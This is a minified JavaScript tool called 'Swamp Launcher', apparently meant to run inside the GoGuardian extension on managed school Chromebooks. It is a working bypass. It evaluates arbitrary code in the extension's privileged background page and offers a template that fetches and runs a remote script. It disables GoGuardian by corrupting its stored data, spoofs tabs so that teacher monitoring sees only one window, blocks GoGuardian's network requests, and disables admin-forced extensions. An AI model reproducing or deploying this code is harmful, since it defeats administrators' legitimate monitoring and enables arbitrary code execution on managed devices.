/*	
Updated by Bypassi on December 28th, 2022
Unminified file at /swamp.js
*/
var swamp,chrome;function _swamp(){swamp={background:chrome.extension?.getBackgroundPage(),elements:{create(e,t){var o=document.createElement(e.tag),a=swamp.strings[t?.id]||swamp.strings;for(var n in e)o[n]=n.startsWith("on")?swamp.functions[e[n]]:e[n];!e.kids&&a[o.id]&&(o.innerHTML=a[o.id]),(t||document.body).appendChild(o),swamp.elements[e.id]=o,e.kids?.forEach(e=>{swamp.elements.create(e,o)})}},functions:{save_code(){localStorage.swamp=swamp.elements.input.value},insert_tab(e){"Tab"===e.key&&(e.preventDefault(),document.execCommand("insertText",!1,"  "))},log_replace(e){swamp.elements.output.textContent+="\n\n"+e,swamp.elements.output.scrollTop=swamp.elements.output.scrollHeight},run_code(){swamp.functions.save_code();try{(this.background?swamp.background:window).eval(swamp.elements.input.value),console.log("Script ran successfully")}catch(e){console.log(e)}},clone(){open("/manifest.json").onload=function(){this.eval(_swamp.toString()+"_swamp();var swamp"),onbeforeunload=void 0,close()}},reload_background(){(swamp.background.chrome.tabs.updateAsync&&!swamp.background.spoof_int||swamp.background.confirm(swamp.strings.confirm_reload))&&(swamp.background.location.reload(),console.log("Scripts running outside were reloaded"))},script_adding_loop(e){swamp.elements.create({tag:"option",textContent:e.name,value:e.code},swamp.elements.select)},script_select(){swamp.elements.input.value=swamp.elements.select.value,swamp.elements.run_code.scrollIntoView(),swamp.functions.save_code()},hard_disable(){for(var e=0;e<localStorage.length;e++)"swamp"!==localStorage.key(e)&&(localStorage[localStorage.key(e)]=this.undo?"":"-");swamp.background.location.reload()},soft_disable(){swamp.background.chrome.tabs.updateAsync=null},hide_tabs(){swamp.background.eval(this.undo?`\nchrome.tabs.captureVisibleTabAsync = chrome.tabs.captureVisibleTabAsync || screenshot_old;\nchrome.windows.getAllAsync = chrome.windows.getAllAsync || get_tabs_old;\nclearInterval(spoof_int);\nspoof_int = null;\nalert("All tabs open were reloaded and visible to GoGuardian");`:`\nvar spoof_int,\n  visible_id = 0,\n  screenshot_old = screenshot_old || chrome.tabs.captureVisibleTabAsync,\n  get_tabs_old = get_tabs_old || chrome.windows.getAllAsync,\n  get_tabs_new = function () {\n    return new Promise((resolve, reject) => {\n      get_tabs_old({\n        populate: true,\n        windowTypes: ["normal"],\n      }).then((tabs) => {\n        tabs.forEach((tab) => {\n          if (tab.id === visible_id) resolve([tab]);\n        });\n      });\n    });\n  };\nchrome.windows.create({ url: "https://pastebin.com/raw/xvY6J6mV" }, (win) => {\n  visible_id = win.id;\n  spoof_int = setInterval(() => {\n    chrome.windows.getLastFocused((window) => {\n      var visible = window.id === visible_id;\n      chrome.tabs.captureVisibleTabAsync = visible ? screenshot_old : null;\n      chrome.windows.getAllAsync = visible ? get_tabs_new : null;\n    });\n  }, 5);\n});`)},get_extensions(){chrome.management.getAll(function(e){e.forEach(function(e){swamp.elements.create({tag:"button",id:e.id,textContent:e.name,enabled:e.enabled,admin:"admin"===e.installType,onclick:"toggle_extension"},swamp.elements.ltbeef_extensions),swamp.functions.strikethrough(swamp.elements[e.id],e.enabled),e.id===chrome.runtime.id&&(swamp.elements[e.id].className="gg")})})},strikethrough(e,t){e.style.textDecoration=t?"none":"line-through"},toggle_extension(){(!this.enabled||this.id!==chrome.runtime.id||swamp.background.confirm(swamp.strings.confirm_remove_gg))&&(this.enabled=!this.enabled,swamp.functions.strikethrough(this,this.enabled),chrome.management.setEnabled(this.id,this.enabled))},manage_all(){var e=this.admin_only,t=this.enabling;[...swamp.elements.ltbeef_extensions.children].forEach(function(o){(!e||o.admin)&&!t!=!o.enabled&&o.id!==chrome.runtime.id&&o.click()})}},scripts:[{name:"Select an option...",code:""},{name:"Display GoGuardian policy",code:`chrome.storage.local.get("policy", (json) => {\n  console.log(JSON.stringify(json));\n});`},{name:"Run a third-party script",code:`fetch("https://example.com/example.js")\n  .then((res) => res.text())\n  .then(eval);`},{name:"Bookmarklet emulator when a Google tab is loaded",code:`chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {\n  if (changeInfo.status == "complete") {\n    chrome.tabs.executeScript(\n      tabId, { code: \`\n        if (location.hostname.endsWith("google.com")) {\n          // Use your own code below:\n          alert("Testing!");\n        }\n      \` }\n    );\n  }\n});`},{name:"Bookmarklet emulator on focused tab when the GoGuardian icon is clicked",code:`chrome.browserAction.onClicked.addListener(() => {\n  chrome.tabs.query({ active: true, currentWindow: true }, (tab) => {\n    chrome.tabs.executeScript(tab[0].id, {\n      code: \`\n        // Your own code below:\n        alert("Testing!");\n      \`,\n      matchAboutBlank: true,\n    });\n  });\n});\n// Credit to Zylenox#2366`},{name:"Toggle all other admin-forced extensions when the GoGuardian icon is clicked",code:`chrome.browserAction.onClicked.addListener(function () {\n  chrome.management.getAll((extensions) => {\n    extensions.forEach((extension) => {\n      if ("admin" === extension.installType && chrome.runtime.id !== extension.id)\n        chrome.management.setEnabled(extension.id, !extension.enabled);\n    });\n  });\n});`},{name:"Display a custom notification",code:`chrome.notifications.create(null, {\n  type: "basic",\n  iconUrl: "https://manage.goguardian.com/favicon.ico",\n  title: "Custom GoGuardian Message",\n  message: "Put your custom message here!",\n});\n// Credit to ilexite#8290`},{name:"Emulate DNS and block all goguardian requests",code:`chrome.webRequest.onBeforeRequest.addListener(\n  () => {\n    return { redirectUrl: "javascript:" };\n  },\n  {\n    urls: ["*://*.goguardian.com/*"],\n  },\n  ["blocking"]\n);`},{name:"Toggle emulated DNS unblocker when the GoGuardian icon is clicked",code:`function block() {\n  return { redirectUrl: "javascript:" };\n}\nvar blocking = false;\nfunction toggle() {\n  if (blocking) {\n    chrome.webRequest.onBeforeRequest.removeListener(block);\n  } else {\n    chrome.webRequest.onBeforeRequest.addListener(\n      block,\n      {\n        urls: ["*://*.goguardian.com/*"],\n      },\n      ["blocking"]\n    );\n  }\n  blocking = !blocking;\n  alert("Emulated DNS unblocker is " + (blocking ? "on!" : "off!"));\n}\ntoggle();\nchrome.browserAction.onClicked.addListener(toggle);\n// This is mainly useful if you run it in the background`},],strings:{style:"pre,textarea{display:inline-block;height:400px}*{box-sizing:border-box}body{padding:10px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{color:#000;font-size:15px}h1,h2,h3,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:10px;padding:10px 17px;border:none}button,input{background-color:#fff;padding:10px 20px;margin:0 5px 5px 0}input{width:600px;border-radius:10px}textarea{white-space:pre;float:left;width:60%;border-radius:10px 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:0 10px 10px 0;padding:8px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:10px;cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}",title:"Swamp Launcher",subtitle:" ",source_link:"<a href='http://vacapena.com'>Made by MainFrame</a>",run_code:{title:"Swamp Executer",description:'Put your script in the Swamp Executer to run it in chrome.',placeholder:"Script input goes here...",output:"Script output shows here:\n\n---",run:"Run Script",reload:"Reload Scripts",run_background:"Run Script Outside",reload_background:"Reload Scripts Outside",button_description:" "},interesting_scripts:{title:"Script Templates",description:"Some script templates you may use and mess around with in Swamp Executer.",policy_description:" ",dns_description:"Also, if you turned on the DNS emulator and previously blocked sites that you've visited before aren't loading, try adding a question mark to the end of the URL, which may clear cache.",background_reminder:"Also when running a script normally will only run the script in the current Swamp Launcher tab, but when running a script outside it will run the script outside the tab."},disable_gg:{title:"Swamp Cookie Blaster",hard_disable:"Hard-Disable GoGuardian",soft_disable:"Soft-Disable GoGuardian",repair:"Repair Cookies",description:"Hard-Disable will disable GoGuardian and persist until you repiair it with the second button, but Soft-Disable will disable GoGuardian until you restart your device.",trouble_warning:"<b>Hard-disable will also prevent your people from seeing your screen, while soft-disable will not. Swamp Cookie Blaster works by messing with some of the cookies that GoGuardian needs to run.</b>"},hide_tabs:{title:"Swamp Tab Spoofer",visible_window:'Open Spoofed Window',undo_hide_tabs:"Undo Tab Spoofing",description:"This button will open a new window, and the person monitoring your device with the GoGuardian Teacher panel will <b>only be able to see tabs opened in the spoofed window.</b> If you open multiple windows with the button, the most recent one will be the visible window.",interference:'For this to work, you cannot have GoGuardian disabled with GoGuardian Hard-Disable.',dont_cheat:"<b>MainFrame really encourages you too not cheat on tests or stuff like that. Swamp Launcher was made to provide students with access to websites that are unjustly denied from them. I really don't condone cheating and Swamp Launcher will be removed as a whole if I hear about stuff like this happening commonly."},ltbeef:{title:'Swamp Extension Disable',manual_description:"Ingot was fixed by Chrome in v106, so this is a great alternative that works in the latest version. The buttons below will allow you to disable or enable all extensions.",broad_options_description:" ",disable_all:"Disable All Extensions",disable_all_admin:"Disable All Admin Extensions",enable_all:"Repair All Extensions",soft_disable_recommendation:"Disabling GoGuardian with this process will close the Swamp Launcher."},confirm_reload:"It looks like you've got soft disable or tab-spoofing active. Reloading the background scripts will also turn these off, so are you sure you want to continue?",confirm_remove_gg:"Are you sure you want to remove GoGuardian? It'll close the launcher until you restart your device."}},document.body.innerHTML="",[{tag:"title",id:"title"},{tag:"style",id:"style"},{tag:"base",target:"_blank"},{tag:"h1",id:"title"},{tag:"h3",id:"subtitle"},{tag:"p",id:"source_link"},{tag:"hr"},{tag:"div",id:"run_code",kids:[{tag:"h2",id:"title"},{tag:"p",id:"description"},{tag:"textarea",id:"input",placeholder:swamp.strings.run_code.placeholder,onkeyup:"save_code",onkeydown:"insert_tab"},{tag:"pre",id:"output"},{tag:"button",id:"run",onclick:"run_code"},{tag:"button",id:"reload",onclick:"clone"},{tag:"br"},{tag:"button",id:"run_background",background:!0,onclick:"run_code"},{tag:"button",id:"reload_background",onclick:"reload_background"},{tag:"p",id:"button_description"},]},{tag:"hr"},{tag:"div",id:"interesting_scripts",kids:[{tag:"h2",id:"title"},{tag:"p",id:"description"},{tag:"select",id:"select",onchange:"script_select"},{tag:"p",id:"policy_description"},{tag:"p",id:"dns_description"},{tag:"p",id:"background_reminder"},]},{tag:"hr"},{tag:"div",id:"disable_gg",kids:[{tag:"h2",id:"title"},{tag:"button",id:"hard_disable",onclick:"hard_disable"},{tag:"button",id:"soft_disable",onclick:"soft_disable"},{tag:"button",id:"repair",undo:!0,onclick:"hard_disable"},{tag:"p",id:"description"},{tag:"p",id:"trouble_warning"},]},{tag:"hr"},{tag:"div",id:"hide_tabs",kids:[{tag:"h2",id:"title"},{tag:"button",id:"visible_window",onclick:"hide_tabs"},{tag:"button",id:"undo_hide_tabs",undo:!0,onclick:"hide_tabs"},{tag:"p",id:"description"},{tag:"p",id:"interference"},{tag:"p",id:"dont_cheat"},]},{tag:"hr"},{tag:"div",id:"ltbeef",kids:[{tag:"h2",id:"title"},{tag:"p",id:"manual_description"},{tag:"div",id:"ltbeef_extensions"},{tag:"p",id:"broad_options_description"},{tag:"button",id:"disable_all",onclick:"manage_all"},{tag:"button",id:"disable_all_admin",admin_only:!0,onclick:"manage_all"},{tag:"button",id:"enable_all",enabling:!0,onclick:"manage_all"},{tag:"p",id:"soft_disable_recommendation"},]},].forEach(e=>{swamp.elements.create(e)}),history.replaceState({},{},"/swamp"),onbeforeunload=()=>!0,console.log=swamp.functions.log_replace,swamp.background.console.log=swamp.functions.log_replace,swamp.scripts.forEach(swamp.functions.script_adding_loop),swamp.functions.get_extensions(),swamp.elements.input.value=localStorage.swamp||""}window!==chrome.extension?.getBackgroundPage()&&(open("/manifest.json").onload=function(){this.eval(_swamp.toString()+"_swamp();var swamp"),top.close()});
